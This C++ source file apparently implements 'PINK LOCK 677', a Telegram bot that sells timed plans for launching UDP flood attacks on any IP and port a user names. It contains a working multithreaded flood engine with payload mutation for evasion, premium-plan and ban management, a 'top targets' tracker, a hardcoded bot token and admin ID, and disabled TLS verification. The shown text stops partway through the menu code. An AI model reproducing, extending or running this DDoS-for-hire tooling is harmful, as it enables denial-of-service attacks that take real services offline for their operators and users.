#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <mutex>
#include <queue>
#include <map>
#include <set>
#include <chrono>
#include <random>
#include <algorithm>
#include <sstream>
#include <iomanip>
#include <fstream>
#include <regex>
#include <csignal>
#include <cstring>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/resource.h>
#include <curl/curl.h>
#include <json/json.h>
#include <condition_variable>
#include <future>
#include <memory>
#include <cmath>

using namespace std;

// ============================================
// CONFIGURATION SECTION
// ============================================
const string BOT_TOKEN = "7343295464:AAGb1pv6TjvDzqx0MmQ1DPWHDqZJ7tgUNTw";
const string ADMIN_USERNAME = "MoinOwner";
const string ADMIN_ID = "6218253783";
const string CHANNEL_LINK = "https://t.me/PYHOSTING0";
const string CHANNEL_USERNAME = "@PYHOSTING0";
const string VERSION = "9.9.9";
const string BOT_NAME = "PINK LOCK 677";

// ============================================
// GLOBAL SETTINGS - MAXIMUM POWER
// ============================================
const int MAX_THREADS = 100000;
const int MAX_PACKET_SIZE = 65507;
const int MAX_DURATION = 86400;
const long long MAX_BYTES = 9999999999LL;
const int DEFAULT_THREADS = 10000;
const int DEFAULT_PACKET_SIZE = 65000;
const int DEFAULT_DURATION = 300;

// ============================================
// DATA STRUCTURES
// ============================================
struct AttackConfig {
    string target_ip;
    int target_port;
    int duration;
    int threads;
    int packet_size;
    long long total_bytes;
    string attack_type;
    string payload_pattern;
    bool use_gpu;
    int cpu_cores;
    int burst_size;
    bool randomize_payload;
};

struct User {
    string username;
    string user_id;
    bool is_premium;
    time_t expiry_date;
    int max_attack_time;
    int max_threads;
    long long total_attacks;
    time_t joined_date;
    bool is_banned;
    string referrer;
    int concurrent_attacks;
};

struct GroupConfig {
    string group_id;
    string group_name;
    bool is_authorized;
    time_t added_date;
    string added_by;
    int max_users;
    bool is_premium_group;
};

struct HostingPlan {
    string plan_name;
    int duration_hours;
    int max_threads;
    long long max_bytes;
    double price;
};

// ============================================
// ADVANCED STATISTICS TRACKER
// ============================================
class AdvancedStatistics {
public:
    atomic<long long> total_packets{0};
    atomic<long long> total_bytes{0};
    atomic<long long> total_attacks{0};
    atomic<long long> active_attacks{0};
    atomic<long long> successful_attacks{0};
    atomic<long long> failed_attacks{0};
    atomic<double> current_pps{0};
    atomic<double> current_mbps{0};
    atomic<double> peak_pps{0};
    atomic<double> peak_mbps{0};
    atomic<long long> total_users{0};
    atomic<long long> premium_users{0};
    atomic<long long> banned_users{0};
    atomic<long long> total_groups{0};
    time_t start_time;
    
    map<string, long long> user_packets;
    map<string, long long> user_bytes;
    map<string, long long> ip_hits;
    mutex stats_mutex;
    
    void record_packet(int bytes, const string& user_id = "") {
        total_packets++;
        total_bytes += bytes;
        
        if (!user_id.empty()) {
            lock_guard<mutex> lock(stats_mutex);
            user_packets[user_id]++;
            user_bytes[user_id] += bytes;
        }
    }
    
    void record_ip_hit(const string& ip) {
        lock_guard<mutex> lock(stats_mutex);
        ip_hits[ip]++;
    }
    
    void update_speed(double pps, double mbps) {
        current_pps = pps;
        current_mbps = mbps;
        
        if (pps > peak_pps) peak_pps = pps;
        if (mbps > peak_mbps) peak_mbps = mbps;
    }
    
    string get_formatted_stats() {
        lock_guard<mutex> lock(stats_mutex);
        stringstream ss;
        ss << "📊 *GLOBAL STATISTICS*\n\n"
           << "🔹 Total Packets: " << format_number(total_packets.load()) << "\n"
           << "🔹 Total Data: " << format_bytes(total_bytes.load()) << "\n"
           << "🔹 Total Attacks: " << total_attacks.load() << "\n"
           << "🔹 Successful: " << successful_attacks.load() << "\n"
           << "🔹 Failed: " << failed_attacks.load() << "\n"
           << "🔹 Active Now: " << active_attacks.load() << "\n"
           << "🔹 Current PPS: " << fixed << setprecision(2) << current_pps.load() << "\n"
           << "🔹 Current MB/s: " << fixed << setprecision(2) << current_mbps.load() << "\n"
           << "🔹 Peak PPS: " << fixed << setprecision(2) << peak_pps.load() << "\n"
           << "🔹 Peak MB/s: " << fixed << setprecision(2) << peak_mbps.load() << "\n"
           << "🔹 Total Users: " << total_users.load() << "\n"
           << "🔹 Premium Users: " << premium_users.load() << "\n"
           << "🔹 Banned Users: " << banned_users.load() << "\n"
           << "🔹 Total Groups: " << total_groups.load() << "\n"
           << "🔹 Uptime: " << get_uptime() << "\n";
        return ss.str();
    }
    
    string get_user_stats(const string& user_id) {
        lock_guard<mutex> lock(stats_mutex);
        stringstream ss;
        ss << "👤 *Your Statistics*\n\n"
           << "📦 Packets Sent: " << format_number(user_packets[user_id]) << "\n"
           << "💾 Data Sent: " << format_bytes(user_bytes[user_id]) << "\n";
        return ss.str();
    }
    
    string get_top_targets() {
        lock_guard<mutex> lock(stats_mutex);
        vector<pair<string, long long>> sorted_ips(ip_hits.begin(), ip_hits.end());
        sort(sorted_ips.begin(), sorted_ips.end(), 
             [](const auto& a, const auto& b) { return a.second > b.second; });
        
        stringstream ss;
        ss << "🎯 *TOP TARGETS*\n\n";
        int count = 0;
        for (const auto& [ip, hits] : sorted_ips) {
            if (++count > 10) break;
            ss << count << ". `" << ip << "` - " << hits << " hits\n";
        }
        return ss.str();
    }
    
    string format_number(long long num) {
        if (num >= 1e12) return to_string(num / 1e12).substr(0, 4) + "T";
        if (num >= 1e9) return to_string(num / 1e9).substr(0, 4) + "B";
        if (num >= 1e6) return to_string(num / 1e6).substr(0, 4) + "M";
        if (num >= 1e3) return to_string(num / 1e3).substr(0, 4) + "K";
        return to_string(num);
    }
    
    string format_bytes(long long bytes) {
        const char* units[] = {"B", "KB", "MB", "GB", "TB", "PB"};
        int unit = 0;
        double size = bytes;
        while (size >= 1024 && unit < 5) {
            size /= 1024;
            unit++;
        }
        stringstream ss;
        ss << fixed << setprecision(2) << size << " " << units[unit];
        return ss.str();
    }
    
    string get_uptime() {
        time_t now = time(nullptr);
        int seconds = difftime(now, start_time);
        int days = seconds / 86400;
        int hours = (seconds % 86400) / 3600;
        int mins = (seconds % 3600) / 60;
        int secs = seconds % 60;
        stringstream ss;
        if (days > 0) ss << days << "d ";
        ss << hours << "h " << mins << "m " << secs << "s";
        return ss.str();
    }
};

AdvancedStatistics global_stats;

// ============================================
// PAYLOAD GENERATOR
// ============================================
class PayloadGenerator {
private:
    random_device rd;
    mt19937_64 gen;
    uniform_int_distribution<> byte_dist;
    
public:
    PayloadGenerator() : gen(rd()), byte_dist(0, 255) {}
    
    void generate(vector<char>& buffer, int size, const string& pattern, bool randomize = false) {
        if (randomize || pattern == "random") {
            for (int i = 0; i < size; i++) {
                buffer[i] = static_cast<char>(byte_dist(gen));
            }
        } else if (pattern == "zeros") {
            memset(buffer.data(), 0, size);
        } else if (pattern == "ones") {
            memset(buffer.data(), 0xFF, size);
        } else if (pattern == "incremental") {
            for (int i = 0; i < size; i++) {
                buffer[i] = static_cast<char>(i % 256);
            }
        } else if (pattern == "decremental") {
            for (int i = 0; i < size; i++) {
                buffer[i] = static_cast<char>(255 - (i % 256));
            }
        } else if (pattern == "checkerboard") {
            for (int i = 0; i < size; i++) {
                buffer[i] = static_cast<char>((i % 2) ? 0xAA : 0x55);
            }
        } else if (pattern == "max_power") {
            // Maximum entropy pattern for maximum power
            for (int i = 0; i < size; i++) {
                buffer[i] = static_cast<char>(byte_dist(gen));
            }
        }
    }
    
    void mutate(vector<char>& buffer, int mutation_rate = 10) {
        uniform_int_distribution<> pos_dist(0, buffer.size() - 1);
        for (int i = 0; i < mutation_rate; i++) {
            buffer[pos_dist(gen)] = static_cast<char>(byte_dist(gen));
        }
    }
};

// ============================================
// ULTIMATE UDP FLOOD ENGINE
// ============================================
class UltimateUDPFloodEngine {
private:
    atomic<bool> running{false};
    vector<thread> workers;
    vector<thread> monitor_threads;
    mutex mtx;
    AttackConfig config;
    chrono::steady_clock::time_point start_time;
    PayloadGenerator payload_gen;
    
    atomic<long long> packets_sent{0};
    atomic<long long> bytes_sent{0};
    atomic<long long> errors{0};
    
    // GPU simulation (prepared for CUDA/OpenCL)
    atomic<bool> gpu_enabled{false};
    atomic<int> gpu_threads{0};
    
public:
    UltimateUDPFloodEngine() {}
    
    void optimize_socket(int sockfd) {
        int broadcast = 1;
        int reuse = 1;
        int buffer_size = 16777216; // 16MB buffer for maximum performance
        int tos = 0x08; // Minimize delay
        int priority = 6; // High priority
        
        setsockopt(sockfd, SOL_SOCKET, SO_BROADCAST, &broadcast, sizeof(broadcast));
        setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
        setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &buffer_size, sizeof(buffer_size));
        setsockopt(sockfd, SOL_SOCKET, SO_RCVBUF, &buffer_size, sizeof(buffer_size));
        setsockopt(sockfd, IPPROTO_IP, IP_TOS, &tos, sizeof(tos));
        
        // Non-blocking with error handling
        int flags = fcntl(sockfd, F_GETFL, 0);
        if (flags < 0) {
            cerr << "Failed to get socket flags\n";
            return;
        }
        if (fcntl(sockfd, F_SETFL, flags | O_NONBLOCK) < 0) {
            cerr << "Failed to set non-blocking mode\n";
            return;
        }
    }
    
    void worker_thread(int thread_id) {
        int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (sockfd < 0) {
            cerr << "Thread " << thread_id << " socket creation failed\n";
            errors++;
            return;
        }
        
        optimize_socket(sockfd);
        
        sockaddr_in dest_addr;
        memset(&dest_addr, 0, sizeof(dest_addr));
        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(config.target_port);
        inet_pton(AF_INET, config.target_ip.c_str(), &dest_addr.sin_addr);
        
        vector<char> payload(config.packet_size);
        payload_gen.generate(payload, config.packet_size, config.payload_pattern, config.randomize_payload);
        
        auto thread_start = chrono::steady_clock::now();
        long long local_packets = 0;
        long long local_bytes = 0;
        int mutation_counter = 0;
        
        while (running) {
            // Burst sending for maximum performance
            for (int burst = 0; burst < config.burst_size; burst++) {
                ssize_t sent = sendto(sockfd, payload.data(), payload.size(), 0,
                                    (sockaddr*)&dest_addr, sizeof(dest_addr));
                
                if (sent > 0) {
                    local_packets++;
                    local_bytes += sent;
                    
                    // Mutate payload periodically for evasion
                    if (config.randomize_payload && ++mutation_counter >= 1000) {
                        mutation_counter = 0;
                        payload_gen.mutate(payload, 50);
                    }
                } else {
                    errors++;
                }
            }
            
            // Check duration
            auto elapsed = chrono::duration_cast<chrono::seconds>(
                chrono::steady_clock::now() - thread_start).count();
            
            if (elapsed >= config.duration) {
                break;
            }
            
            // Strategic yielding
            if (thread_id % 100 == 0) {
                this_thread::yield();
            }
        }
        
        close(sockfd);
        
        packets_sent += local_packets;
        bytes_sent += local_bytes;
        global_stats.record_packet(local_bytes);
        global_stats.record_ip_hit(config.target_ip);
    }
    
    void performance_monitor() {
        auto last_check = chrono::steady_clock::now();
        long long last_packets = 0;
        
        while (running) {
            this_thread::sleep_for(chrono::seconds(1));
            
            auto now = chrono::steady_clock::now();
            auto elapsed = chrono::duration_cast<chrono::seconds>(now - start_time).count();
            
            long long current_packets = packets_sent.load();
            long long diff = current_packets - last_packets;
            
            double pps = diff;
            double mbps = (bytes_sent.load() / (elapsed > 0 ? elapsed : 1)) / (1024.0 * 1024.0);
            
            global_stats.update_speed(pps, mbps);
            
            last_packets = current_packets;
            
            // Auto-adjust if needed
            if (elapsed >= config.duration) {
                stop_attack();
                break;
            }
        }
    }
    
    bool start_attack(const AttackConfig& cfg) {
        if (running) return false;
        
        config = cfg;
        running = true;
        global_stats.active_attacks++;
        global_stats.total_attacks++;
        start_time = chrono::steady_clock::now();
        
        // Launch worker threads in batches
        int batch_size = 1000;
        for (int i = 0; i < config.threads; i += batch_size) {
            int current_batch = min(batch_size, config.threads - i);
            for (int j = 0; j < current_batch; j++) {
                workers.emplace_back(&UltimateUDPFloodEngine::worker_thread, this, i + j);
            }
            this_thread::sleep_for(chrono::milliseconds(10)); // Stagger thread creation
        }
        
        // Launch monitors
        monitor_threads.emplace_back(&UltimateUDPFloodEngine::performance_monitor, this);
        
        return true;
    }
    
    void stop_attack() {
        running = false;
        
        for (auto& t : workers) {
            if (t.joinable()) t.join();
        }
        workers.clear();
        
        for (auto& t : monitor_threads) {
            if (t.joinable()) t.join();
        }
        monitor_threads.clear();
        
        global_stats.active_attacks--;
        global_stats.successful_attacks++;
    }
    
    bool is_running() const { return running; }
    
    string get_live_stats() {
        auto elapsed = chrono::duration_cast<chrono::seconds>(
            chrono::steady_clock::now() - start_time).count();
        
        long long packets = packets_sent.load();
        long long bytes = bytes_sent.load();
        
        double pps = elapsed > 0 ? static_cast<double>(packets) / elapsed : 0;
        double mbps = elapsed > 0 ? (static_cast<double>(bytes) / elapsed) / (1024 * 1024) : 0;
        
        stringstream ss;
        ss << "⚡ *LIVE ATTACK STATS*\n\n"
           << "🎯 Target: `" << config.target_ip << ":" << config.target_port << "`\n"
           << "⏱ Elapsed: " << elapsed << "/" << config.duration << " seconds\n"
           << "🧵 Active Threads: " << config.threads << "\n"
           << "📦 Packet Size: " << config.packet_size << " bytes\n"
           << "🔣 Pattern: " << config.payload_pattern << "\n"
           << "📊 Packets: " << global_stats.format_number(packets) << "\n"
           << "💾 Data: " << global_stats.format_bytes(bytes) << "\n"
           << "🚀 PPS: " << fixed << setprecision(0) << pps << "\n"
           << "⚡ MB/s: " << fixed << setprecision(2) << mbps << "\n"
           << "❌ Errors: " << errors.load() << "\n"
           << "🔥 Status: " << (running ? "🟢 ATTACKING" : "🔴 STOPPED") << "\n";
        return ss.str();
    }
    
    string get_final_report() {
        auto elapsed = chrono::duration_cast<chrono::seconds>(
            chrono::steady_clock::now() - start_time).count();
        
        stringstream ss;
        ss << "✅ *ATTACK COMPLETED*\n\n"
           << "🎯 Target: `" << config.target_ip << ":" << config.target_port << "`\n"
           << "⏱ Duration: " << elapsed << " seconds\n"
           << "📊 Total Packets: " << global_stats.format_number(packets_sent.load()) << "\n"
           << "💾 Total Data: " << global_stats.format_bytes(bytes_sent.load()) << "\n"
           << "🚀 Avg PPS: " << fixed << setprecision(0) << (packets_sent.load() / (elapsed > 0 ? elapsed : 1)) << "\n"
           << "⚡ Avg MB/s: " << fixed << setprecision(2) << (bytes_sent.load() / (elapsed > 0 ? elapsed : 1) / (1024.0 * 1024.0)) << "\n"
           << "❌ Total Errors: " << errors.load() << "\n";
        return ss.str();
    }
    
    ~UltimateUDPFloodEngine() {
        stop_attack();
    }
};

// ============================================
// COMPLETE USER & GROUP MANAGEMENT
// ============================================
class CompleteUserManager {
private:
    map<string, User> users;
    map<string, GroupConfig> groups;
    map<string, HostingPlan> hosting_plans;
    mutex user_mutex;
    mutex group_mutex;
    mutex plan_mutex;
    
public:
    CompleteUserManager() {
        // Initialize hosting plans
        hosting_plans["1HOUR"] = {"1 Hour Access", 1, 5000, 9999999999LL, 0.0};
        hosting_plans["1DAY"] = {"1 Day Access", 24, 10000, 9999999999LL, 0.0};
        hosting_plans["1WEEK"] = {"1 Week Access", 168, 25000, 9999999999LL, 0.0};
        hosting_plans["1MONTH"] = {"1 Month Access", 720, 50000, 9999999999LL, 0.0};
        hosting_plans["LIFETIME"] = {"Lifetime Access", 87600, 100000, 9999999999LL, 0.0};
    }
    
    void add_user(const string& user_id, const string& username, const string& referrer = "") {
        lock_guard<mutex> lock(user_mutex);
        if (users.find(user_id) == users.end()) {
            User u;
            u.user_id = user_id;
            u.username = username;
            u.is_premium = false;
            u.expiry_date = time(nullptr) + 3600; // 1 hour default
            u.max_attack_time = 60;
            u.max_threads = 100;
            u.total_attacks = 0;
            u.joined_date = time(nullptr);
            u.is_banned = false;
            u.referrer = referrer;
            u.concurrent_attacks = 1;
            users[user_id] = u;
            global_stats.total_users++;
        }
    }
    
    void set_premium(const string& user_id, const string& plan_type, int custom_days = 0) {
        lock_guard<mutex> lock(user_mutex);
        if (users.find(user_id) == users.end()) return;
        
        User& u = users[user_id];
        u.is_premium = true;
        
        if (hosting_plans.find(plan_type) != hosting_plans.end()) {
            HostingPlan& plan = hosting_plans[plan_type];
            u.expiry_date = time(nullptr) + (plan.duration_hours * 3600);
            u.max_attack_time = 3600; // 1 hour per attack
            u.max_threads = plan.max_threads;
            u.concurrent_attacks = 3;
        } else if (custom_days > 0) {
            u.expiry_date = time(nullptr) + (custom_days * 86400);
            u.max_attack_time = 3600;
            u.max_threads = 10000;
            u.concurrent_attacks = 5;
        }
        
        global_stats.premium_users++;
    }
    
    void set_custom_limits(const string& user_id, int days, int max_time, int max_threads, int concurrent) {
        lock_guard<mutex> lock(user_mutex);
        if (users.find(user_id) != users.end()) {
            User& u = users[user_id];
            u.is_premium = true;
            u.expiry_date = time(nullptr) + (days * 86400);
            u.max_attack_time = max_time;
            u.max_threads = max_threads;
            u.concurrent_attacks = concurrent;
        }
    }
    
    bool is_authorized(const string& user_id) {
        lock_guard<mutex> lock(user_mutex);
        auto it = users.find(user_id);
        if (it == users.end()) return false;
        
        User& u = it->second;
        if (u.is_banned) return false;
        if (u.is_premium && time(nullptr) > u.expiry_date) {
            u.is_premium = false;
            global_stats.premium_users--;
            return false;
        }
        return true;
    }
    
    bool can_attack(const string& user_id, int threads, int duration) {
        lock_guard<mutex> lock(user_mutex);
        auto it = users.find(user_id);
        if (it == users.end()) return false;
        
        User& u = it->second;
        if (!u.is_premium) return false;
        if (threads > u.max_threads) return false;
        if (duration > u.max_attack_time) return false;
        return true;
    }
    
    void ban_user(const string& user_id, const string& reason = "") {
        lock_guard<mutex> lock(user_mutex);
        if (users.find(user_id) != users.end()) {
            users[user_id].is_banned = true;
            global_stats.banned_users++;
        }
    }
    
    void unban_user(const string& user_id) {
        lock_guard<mutex> lock(user_mutex);
        if (users.find(user_id) != users.end()) {
            if (users[user_id].is_banned) {
                users[user_id].is_banned = false;
                global_stats.banned_users--;
            }
        }
    }
    
    void add_group(const string& group_id, const string& group_name, const string& added_by, bool premium = false) {
        lock_guard<mutex> lock(group_mutex);
        GroupConfig g;
        g.group_id = group_id;
        g.group_name = group_name;
        g.is_authorized = true;
        g.added_date = time(nullptr);
        g.added_by = added_by;
        g.max_users = premium ? 1000 : 100;
        g.is_premium_group = premium;
        groups[group_id] = g;
        global_stats.total_groups++;
    }
    
    void remove_group(const string& group_id) {
        lock_guard<mutex> lock(group_mutex);
        if (groups.erase(group_id) > 0) {
            global_stats.total_groups--;
        }
    }
    
    bool is_group_authorized(const string& group_id) {
        lock_guard<mutex> lock(group_mutex);
        auto it = groups.find(group_id);
        return it != groups.end() && it->second.is_authorized;
    }
    
    string get_user_info(const string& user_id) {
        lock_guard<mutex> lock(user_mutex);
        auto it = users.find(user_id);
        if (it == users.end()) return "❌ User not found";
        
        User& u = it->second;
        time_t now = time(nullptr);
        int remaining = difftime(u.expiry_date, now);
        
        stringstream ss;
        ss << "👤 *User Profile*\n\n"
           << "🆔 ID: `" << u.user_id << "`\n"
           << "👤 Username: @" << u.username << "\n"
           << "⭐ Status: " << (u.is_premium ? "✅ PREMIUM" : "❌ FREE") << "\n"
           << "⏱ Max Attack Time: " << u.max_attack_time << "s\n"
           << "🧵 Max Threads: " << u.max_threads << "\n"
           << "🔥 Concurrent Attacks: " << u.concurrent_attacks << "\n";
        
        if (u.is_premium && remaining > 0) {
            int days = remaining / 86400;
            int hours = (remaining % 86400) / 3600;
            ss << "⏳ Expires in: " << days << "d " << hours << "h\n";
        }
        
        ss << "📅 Joined: " << ctime(&u.joined_date)
           << "🚫 Banned: " << (u.is_banned ? "YES" : "NO") << "\n"
           << global_stats.get_user_stats(user_id);
        
        return ss.str();
    }
    
    string get_all_users_list() {
        lock_guard<mutex> lock(user_mutex);
        stringstream ss;
        ss << "👥 *ALL USERS*\n\n";
        int count = 0;
        for (const auto& [id, u] : users) {
            ss << ++count << ". @" << u.username 
               << " (" << (u.is_premium ? "⭐" : "❌") 
               << (u.is_banned ? "🚫" : "") << ")\n";
            if (count >= 50) {
                ss << "... and " << (users.size() - 50) << " more\n";
                break;
            }
        }
        ss << "\nTotal: " << users.size() << " users\n";
        return ss.str();
    }
    
    string get_all_groups() {
        lock_guard<mutex> lock(group_mutex);
        stringstream ss;
        ss << "📋 *AUTHORIZED GROUPS*\n\n";
        for (const auto& [id, g] : groups) {
            ss << "• " << g.group_name << " (`" << id << "`)\n"
               << "  Added by: @" << g.added_by << "\n"
               << "  Premium: " << (g.is_premium_group ? "✅" : "❌") << "\n"
               << "  Max Users: " << g.max_users << "\n\n";
        }
        return ss.str();
    }
    
    string get_hosting_plans() {
        stringstream ss;
        ss << "🎁 *HOSTING PLANS*\n\n";
        for (const auto& [code, plan] : hosting_plans) {
            ss << "• *" << plan.plan_name << "* (`" << code << "`)\n"
               << "  Duration: " << plan.duration_hours << " hours\n"
               << "  Max Threads: " << plan.max_threads << "\n"
               << "  Max Bytes: " << global_stats.format_bytes(plan.max_bytes) << "\n\n";
        }
        return ss.str();
    }
};

CompleteUserManager user_manager;

// ============================================
// TELEGRAM API HANDLER
// ============================================
class TelegramAPI {
private:
    string token;
    
    static size_t WriteCallback(void* contents, size_t size, size_t nmemb, string* userp) {
        userp->append((char*)contents, size * nmemb);
        return size * nmemb;
    }
    
public:
    TelegramAPI(const string& bot_token) : token(bot_token) {}
    
    string make_request(const string& method, const Json::Value& params) {
        CURL* curl = curl_easy_init();
        string response;
        
        if (curl) {
            string url = "https://api.telegram.org/bot" + token + "/" + method;
            
            Json::StreamWriterBuilder builder;
            string json_data = Json::writeString(builder, params);
            
            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_data.c_str());
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
            curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
            curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
            
            struct curl_slist* headers = nullptr;
            headers = curl_slist_append(headers, "Content-Type: application/json");
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
            
            CURLcode res = curl_easy_perform(curl);
            (void)res;
            curl_easy_cleanup(curl);
            curl_slist_free_all(headers);
        }
        
        return response;
    }
    
    void send_message(long long chat_id, const string& text, 
                     const Json::Value& reply_markup = Json::Value(), 
                     const string& parse_mode = "Markdown") {
        Json::Value params;
        params["chat_id"] = static_cast<Json::Int64>(chat_id);
        params["text"] = text;
        params["parse_mode"] = parse_mode;
        params["disable_web_page_preview"] = true;
        
        if (!reply_markup.empty()) {
            params["reply_markup"] = reply_markup;
        }
        
        make_request("sendMessage", params);
    }
    
    void send_photo(long long chat_id, const string& photo_url, const string& caption = "") {
        Json::Value params;
        params["chat_id"] = static_cast<Json::Int64>(chat_id);
        params["photo"] = photo_url;
        if (!caption.empty()) {
            params["caption"] = caption;
            params["parse_mode"] = "Markdown";
        }
        make_request("sendPhoto", params);
    }
    
    void edit_message(long long chat_id, long long message_id, const string& text,
                     const Json::Value& reply_markup = Json::Value()) {
        Json::Value params;
        params["chat_id"] = static_cast<Json::Int64>(chat_id);
        params["message_id"] = static_cast<Json::Int64>(message_id);
        params["text"] = text;
        params["parse_mode"] = "Markdown";
        
        if (!reply_markup.empty()) {
            params["reply_markup"] = reply_markup;
        }
        
        make_request("editMessageText", params);
    }
    
    void answer_callback(const string& callback_id, const string& text, bool show_alert = false) {
        Json::Value params;
        params["callback_query_id"] = callback_id;
        params["text"] = text;
        params["show_alert"] = show_alert;
        
        make_request("answerCallbackQuery", params);
    }
    
    void delete_message(long long chat_id, long long message_id) {
        Json::Value params;
        params["chat_id"] = static_cast<Json::Int64>(chat_id);
        params["message_id"] = static_cast<Json::Int64>(message_id);
        make_request("deleteMessage", params);
    }
    
    string get_updates(long long offset) {
        Json::Value params;
        params["offset"] = static_cast<Json::Int64>(offset);
        params["limit"] = 100;
        params["timeout"] = 30;
        
        return make_request("getUpdates", params);
    }
    
    void send_chat_action(long long chat_id, const string& action) {
        Json::Value params;
        params["chat_id"] = static_cast<Json::Int64>(chat_id);
        params["action"] = action;
        make_request("sendChatAction", params);
    }
};

// ============================================
// COMPLETE KEYBOARD SYSTEM
// ============================================
class CompleteKeyboard {
public:
    Json::Value keyboard;
    
    void add_button(const string& text, const string& callback_data, int row = 0) {
        Json::Value button;
        button["text"] = text;
        button["callback_data"] = callback_data;
        
        ensure_row(row);
        keyboard["inline_keyboard"][row].append(button);
    }
    
    void add_url_button(const string& text, const string& url, int row = 0) {
        Json::Value button;
        button["text"] = text;
        button["url"] = url;
        
        ensure_row(row);
        keyboard["inline_keyboard"][row].append(button);
    }
    
    void add_switch_inline_query(const string& text, const string& query, int row = 0) {
        Json::Value button;
        button["text"] = text;
        button["switch_inline_query_current_chat"] = query;
        
        ensure_row(row);
        keyboard["inline_keyboard"][row].append(button);
    }
    
    Json::Value get() const { return keyboard; }
    
private:
    void ensure_row(int row) {
        while (keyboard["inline_keyboard"].size() <= row) {
            keyboard["inline_keyboard"].append(Json::Value(Json::arrayValue));
        }
    }
};

// ============================================
// MAIN BOT CLASS - PINK LOCK 677
// ============================================
class PinkLockBot {
private:
    TelegramAPI api;
    UltimateUDPFloodEngine engine;
    atomic<bool> running{false};
    long long last_update_id = 0;
    
    atomic<bool> attack_running{false};
    string current_target;
    map<string, AttackConfig> user_attack_configs;
    mutex config_mutex;
    
public:
    PinkLockBot(const string& token) : api(token) {}
    
    // ==================== KEYBOARDS ====================
    
    Json::Value get_main_keyboard(bool is_admin = false) {
        CompleteKeyboard kb;
        kb.add_button("🚀 START ATTACK", "start_attack", 0);
        kb.add_button("⚡ QUICK ATTACK", "quick_attack", 0);
        kb.add_button("🎛 ADVANCED ATTACK", "advanced_attack", 0);
        kb.add_button("📊 STATISTICS", "show_stats", 1);
        kb.add_button("⚙️ SETTINGS", "settings", 1);
        kb.add_button("👤 MY PROFILE", "my_profile", 1);
        kb.add_button("📢 JOIN CHANNEL", "join_channel", 2);
        kb.add_button("👤 CONTACT OWNER", "contact_owner", 2);
        kb.add_button("🎁 HOSTING PLANS", "hosting_plans", 2);
        kb.add_button("❓ HELP / COMMANDS", "show_help", 3);
        kb.add_button("ℹ️ ABOUT BOT", "about_bot", 3);
        
        if (is_admin) {
            kb.add_button("🔐 ADMIN PANEL", "admin_panel", 4);
        }
        
        return kb.get();
    }
    
    Json::Value get_attack_keyboard() {
        CompleteKeyboard kb;
        kb.add_button("⏹ STOP ATTACK", "stop_attack", 0);
        kb.add_button("📈 LIVE STATS", "live_stats", 0);
        kb.add_button("🔄 REFRESH", "refresh_attack", 0);
        kb.add_button("🔙 MAIN MENU", "main_menu", 1);
        return kb.get();
    }
    
    Json::Value get_advanced_attack_keyboard() {
        CompleteKeyboard kb;
        kb.add_button("🎲 RANDOM PAYLOAD", "payload_random", 0);
        kb.add_button("0️⃣ ZEROS", "payload_zeros", 0);
        kb.add_button("1️⃣ ONES", "payload_ones", 0);
        kb.add_button("📈 INCREMENTAL", "payload_incremental", 1);
        kb.add_button("📉 DECREMENTAL", "payload_decremental", 1);
        kb.add_button("🏁 CHECKERBOARD", "payload_checkerboard", 1);
        kb.add_button("💥 MAX POWER", "payload_maxpower", 2);
        kb.add_button("🔙 BACK", "start_attack", 3);
        return kb.get();
    }
    
    Json::Value get_settings_keyboard() {
        CompleteKeyboard kb;
        kb.add_button("🧵 THREADS: 10000", "set_threads_10000", 0);
        kb.add_button("🧵 THREADS: 50000", "set_threads_50000", 0);
        kb.add_button("🧵 THREADS: 100000", "set_threads_100000", 0);
        kb.add_button("📦 PACKET: 65000", "set_packet_65000", 1);
        kb.add_button("📦 PACKET: 32768", "set_packet_32768", 1);
        kb.add_button("⏱ TIME: 300s", "set_time_300", 2);
        kb.add_button("⏱ TIME: 600s", "set_time_600", 2);
        kb.add_button("🔙 MAIN MENU", "main_menu", 3);
        return kb.get();
    }
    
    Json::Value get_admin_keyboard() {
        CompleteKeyboard kb;
        kb.add_button("👥 USER MANAGEMENT", "user_mgmt", 0);
        kb.add_button("📊 ALL USERS", "all_users", 0);
        kb.add_button("👥 GROUP MANAGEMENT", "group_mgmt", 1);
        kb.add_button("📈 GLOBAL STATS", "global_stats", 1);
        kb.add_button("🎯 TOP TARGETS", "top_targets", 2);
        kb.add_button("🎁 GIVE PREMIUM", "give_premium", 2);
        kb.add_button("🚫 BAN USER", "ban_user", 3);
        kb.add_button("✅ UNBAN USER", "unban_user", 3);
        kb.add_button("📢 BROADCAST", "broadcast_msg", 4);
        kb.add_button("🔧 BOT SETTINGS", "bot_settings", 4);
        kb.add_button("🔙 MAIN MENU", "main_menu", 5);
        return kb.get();
    }
    
    Json::Value get_user_mgmt_keyboard() {
        CompleteKeyboard kb;
        kb.add_button("➕ ADD USER", "add_user_manual", 0);
        kb.add_button("⭐ GIVE PREMIUM", "give_premium_select", 0);
        kb.add_button("🚫 BAN", "ban_user_select", 1);
        kb.add_button("✅ UNBAN", "unban_user_select", 1);
        kb.add_button("🔍 SEARCH USER", "search_user", 2);
        kb.add_button("🔙 ADMIN PANEL", "admin_panel", 3);
        return kb.get();
    }
    
    Json::Value get_hosting_keyboard() {
        CompleteKeyboard kb;
        kb.add_button("⚡ 1 HOUR", "plan_1HOUR", 0);
        kb.add_button("📅 1 DAY", "plan_1DAY", 0);
        kb.add_button("📆 1 WEEK", "plan_1WEEK", 1);
        kb.add_button("🗓 1 MONTH", "plan_1MONTH", 1);
        kb.add_button("♾️ LIFETIME", "plan_LIFETIME", 2);
        kb.add_button("🔙 MAIN MENU", "main_menu", 3);
        return kb.get();
    }
    
    Json::Value get_confirm_keyboard(const string& action) {
        CompleteKeyboard kb;
        kb.add_button("✅ CONFIRM", "confirm_" + action, 0);
